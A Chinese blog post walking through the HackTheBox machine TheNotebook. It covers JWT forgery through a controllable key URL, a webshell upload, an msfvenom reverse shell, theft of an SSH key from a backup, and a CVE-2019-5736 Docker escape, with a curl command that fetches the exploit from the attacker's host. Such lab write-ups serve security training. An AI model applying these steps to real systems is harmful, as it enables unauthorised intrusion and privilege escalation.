---
layout:     post
title:      HackTheBox TheNotebook
subtitle:   HackTheBox
date:       2021-05-28
author:     heria
header-img: img/post-bg-23.jpg
catalog: true
tags:
---

# 

![image-20210528113226567](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528113226567.png)

## 信息收集

nmap -sS -sV -sC 10.10.10.230

![image-20210528113349405](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528113349405.png)

## 渗透

开放22 80 10010端口，查看80端口

![image-20210528113531249](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528113531249.png)

register可以注册用户

![image-20210528114029134](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528114029134.png)

但是注册之后发现用户只能写note

![image-20210528114138575](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528114138575.png)



注册时抓包，注册完之后返回了JWT Token

![image-20210528114912152](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528114912152.png)

![image-20210528115005711](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528115005711.png)



获取到的token信息复制出来

到该站点https://jwt.io/

通过RS256进行解密

![image-20210528130440160](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528130440160.png)



decoded之后发现在header中存在"http://localhost:7070/privKey.key"这样的地址

在payload中存在admin_cap：0的字段，推测为权限设置

私钥地址应该可控，所以我们可以修改权限参数，并修改私钥地址为自己的地址，使得请求合法

执行以下指令生成公私钥

```
openssl genrsa -out rsa_private.pem 2048	#私钥
openssl rsa -in rsa_private.pem -outform PEM -pubout -out rsa_public.pem	#公钥
```

![image-20210528131429317](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528131429317.png)



之后更改私钥地址和权限控制标志，并通过我们之前生成的公私钥进行签名，生成新的合法token

![image-20210528132333838](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528132333838.png)

python开启http服务，是目标机能够访问存放私钥的位置

```
python -m SimpleHTTPServer 9999
```

之后替换掉cookie，刷新页面，发现相比之前多了admin panel此时便是以admin登录的

![image-20210528133604350](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528133604350.png)



后台存在上传文件功能，直接上传一句话配合蚁剑，拿到低权限

![image-20210528134948003](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528134948003.png)

站点会定期删除上传的shell,所以通过msfvenom生成反弹shell的木马，上传后目标机上线msf

![image-20210528142244497](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528142244497.png)



在站点处找到存在备份的提示，并在主机/var/backups中找到了home.tar.gz文件

![image-20210528143250988](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143250988.png)

![image-20210528143344025](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143344025.png)

之后尝试tar -zxvf解压，发现在该文件夹下没有权限，所以将home.tar.gz复制到/tmp下再进行解压操作

![image-20210528143651608](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143651608.png)

找到nosh

![image-20210528143730872](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143730872.png)

并在下面找到ssh私钥

![image-20210528143849911](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143849911.png)

![image-20210528144019815](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528144019815.png)

我们通过cat /etc/passwd发现存在noah的用户，尝试通过ssh密钥对方法登录

![image-20210528143947448](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528143947448.png)

cat 抓取内容，之后复制到kali攻击机

![image-20210528144228797](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528144228797.png)

遇到一个小坑，id_rsa权限过大会导致不安全，最终认证失败，此时只需要chmod 0600 id_rsa就能解决问题

![image-20210528144922454](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528144922454.png)

之后再次执行ssh -i id_rsa noah@10.10.10.230 使用密钥对登录

成功以noah用户登录

![image-20210528145135701](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528145135701.png)

拿到user.txt中的flag

![image-20210528145227227](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528145227227.png)

## 提权

sudo -l 

![image-20210528145655467](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528145655467.png)

docker --version,找到docker版本

![image-20210528145806385](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528145806385.png)

之后根据版本信息搜索漏洞

![image-20210528145833307](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528145833307.png)

CVE-2019-5736docker逃逸漏洞

https://github.com/Frichetten/CVE-2019-5736-PoC下载poc,并更改反弹shell语句

![image-20210528150812771](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528150812771.png)

编译，由于kali下未安装go环境，我放到了另外一台centos下进行的编译，最终会生成一个main文件

```
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```

![image-20210528151553329](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528151553329.png)

kali首先开启http服务，供目标机下载main文件

终端执行

```
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
curl ip:port/main -o main
chmod +x main
```

进入容器，将exp置入容器内部

![image-20210528152127269](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528152127269.png)

kali开启监听，再开启一个ssh终端，在原先的终端中执行./main运行exp，后在新终端中执行

```
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

之后kali就成功获得反弹shell.

![image-20210528152724303](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528152724303.png)

找到root.txt下的flag

![image-20210528153432069](https://raw.githubusercontent.com/heriachen/cloudimg/main/img3/image-20210528153432069.png)

